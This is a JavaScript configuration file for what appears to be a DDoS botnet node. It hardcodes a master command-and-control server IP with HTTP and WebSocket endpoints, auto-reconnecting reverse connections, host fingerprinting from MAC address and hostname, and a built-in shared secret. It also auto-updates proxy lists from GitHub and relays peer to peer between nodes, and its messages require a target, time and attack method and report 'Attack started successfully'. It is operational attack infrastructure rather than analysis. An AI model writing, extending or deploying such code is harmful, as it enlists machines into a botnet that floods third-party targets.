import path from 'path';
import os from 'os';
import crypto from 'crypto';
import fs from 'fs';
import { fileURLToPath } from 'url';

// ESM pengganti __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

function getStableNodeId() {
  const nodeIdFile = path.join(__dirname, '.node_id');
  
  try {
    if (fs.existsSync(nodeIdFile)) {
      const savedId = fs.readFileSync(nodeIdFile, 'utf8').trim();
      if (savedId && savedId.length > 0) {
        console.log(`[CONFIG] Using existing node_id from file: ${savedId}`);
        return savedId;
      }
    }
    
    const networkInterfaces = os.networkInterfaces();
    let macAddress = '';
   
    for (const interfaceName in networkInterfaces) {
      const interfaces = networkInterfaces[interfaceName];
      for (const iface of interfaces) {
        if (iface.mac && iface.mac !== '00:00:00:00:00:00' && !iface.internal) {
          macAddress = iface.mac;
          break;
        }
      }
      if (macAddress) break;
    }
    
    const serverPort = process.env.PORT || process.env.SERVER_PORT || 5032;
    const uniqueString = `${os.hostname()}-${macAddress || 'no-mac'}-${process.pid}-${serverPort}-${Date.now()}`;
    const nodeId = crypto
      .createHash('sha256')
      .update(uniqueString)
      .digest('hex')
      .substring(0, 32);
    
    fs.writeFileSync(nodeIdFile, nodeId, 'utf8');
    console.log(`[CONFIG] Generated new stable node_id: ${nodeId}`);
    
    return nodeId;
  } catch (error) {
    console.error('[CONFIG] Error generating stable node_id:', error.message);
    return `${os.hostname()}-${process.pid}-${Date.now()}-${Math.random()
      .toString(36)
      .substr(2, 9)}`;
  }
}

const config = {
  SERVER: {
    PORT: process.env.PORT || process.env.SERVER_PORT || 5032,
    NODE_ENV: process.env.NODE_ENV || 'production',
    METHODS_PATH: path.join(__dirname, '..', 'database', 'methods.json'),
    HOSTNAME: os.hostname(),
    PID: process.pid,
  },

  MASTER: {
    URL: 'http://217.160.125.125:13734',
    WS_URL: 'ws://217.160.125.125:13734/ws',
    HEARTBEAT_INTERVAL: 30000,
    METHODS_SYNC_INTERVAL: 60000,
    TIMEOUT: 10000,
    NOTIFY_ON_SYNC: true
  },

  REVERSE: {
    ENABLE_AUTO: true,
    RETRY_INTERVAL: 10000,
    HEARTBEAT_INTERVAL: 30000,
    MAX_RECONNECT_ATTEMPTS: 10,
  },

  NODE: {
    ID: process.env.NODE_ID || getStableNodeId(),
    IP: process.env.SERVER_IP || null,
    ENV: process.env.NODE_ENV || 'production',
  },

  ENCRYPTION: {
    ENABLED: process.env.ENCRYPTION_ENABLED !== 'false',
    SHARED_SECRET: process.env.SHARED_SECRET || 'narxz1337/0x/1x',
    VERSION: '1.0',
    ALGORITHM: 'aes-256-gcm',
    SALT_LENGTH: 16,
    IV_LENGTH: 12,
    AUTH_TAG_LENGTH: 16,
    KEY_DERIVATION: {
      ITERATIONS: 100000,
      KEYLENGTH: 32,
      DIGEST: 'sha256'
    }
  },

  DEFAULTS: {
    PORT: 80,
    TIME_MIN: 1,
    PORT_MIN: 1,
    PORT_MAX: 65535,
  },
  
  ZOMBIE_DETECTION: {
    ENABLED: true,
    CHECK_INTERVAL: 3000,
    GRACE_PERIOD: 2000,
    AUTO_KILL: true
  },

  PROXY: {
    AUTO_UPDATE: true,
    UPDATE_INTERVAL_MINUTES: 10,
    SOURCES: [
      'https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/refs/heads/main/http/raw/all.txt',
      'https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/refs/heads/main/socks4/raw/all.txt',
      'https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/refs/heads/main/socks5/raw/all.txt',
      'https://raw.githubusercontent.com/elliottophellia/proxylist/refs/heads/master/results/http/global/http_checked.txt'
    ]
  },
  
  // P2P Hybrid Configuration
  P2P: {
    ENABLED: true, // Enable P2P hybrid mode
    DISCOVERY_INTERVAL: 60000, // 1 minute - interval untuk discovery peers dari master
    PEER_TIMEOUT: 180000, // 3 minutes - timeout untuk peer yang tidak aktif
    MAX_PEERS: 2, // maksimal peers yang dapat terkoneksi
    AUTO_CONNECT: true, // otomatis koneksi ke peers yang reachable
    RELAY_FALLBACK: true, // fallback ke relay lewat master jika P2P gagal
    HEARTBEAT_INTERVAL: 30000 // 30 seconds - interval heartbeat antar peers
  },
  
  MESSAGES: {
    REQUIRED_FIELDS: 'target, time, methods wajib diisi',
    INVALID_METHOD: 'methods tidak valid',
    INVALID_TIME: 'time tidak valid',
    INVALID_PORT: 'port tidak valid',
    EXEC_SUCCESS: 'Attack started successfully',
    EXEC_ERROR: 'Failed to execute command',
    PROCESS_NOT_FOUND: 'Process not found',
    STATUS_ERROR: 'Gagal mengambil status sistem',
  },
  
  LOGGING: {
    LEVEL: process.env.LOG_LEVEL || 'info',
    ENCRYPTION_DEBUG: process.env.ENCRYPTION_DEBUG === 'true',
  }
};

export default config;